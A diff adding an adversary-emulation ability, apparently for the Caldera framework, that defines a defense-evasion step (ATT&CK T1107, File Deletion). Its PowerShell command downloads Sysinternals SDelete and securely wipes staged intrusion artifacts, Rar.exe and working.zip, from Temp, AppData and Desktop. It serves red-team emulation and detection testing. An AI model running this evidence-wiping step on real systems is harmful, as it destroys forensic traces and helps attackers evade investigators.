@@ -1,0 +1,29 @@
+---
+- id: 208b021b-c79a-4176-8ad1-3af99ed50c6f
+  name: 9.C - Artifact Cleanup - Delete Staged Files
+  description: Cleanup files related to Operation
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1107
+    name: File Deletion
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+
+
+          if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
+            mkdir "C:\Program Files\SysInternalsSuite";
+          }
+          set-location "C:\Program Files\SysInternalsSuite";
+
+          if (!$(test-path -path "sdelete64.exe")) {
+            iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
+            Expand-Archive sdelete64.zip -force;
+          }
+          copy sdelete64.exe C:\Windows\Temp\;
+          cd C:\Windows\Temp\ ;
+          .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+          .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+          .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+          remove-item C:\Windows\Temp\sdelete64.exe -force;
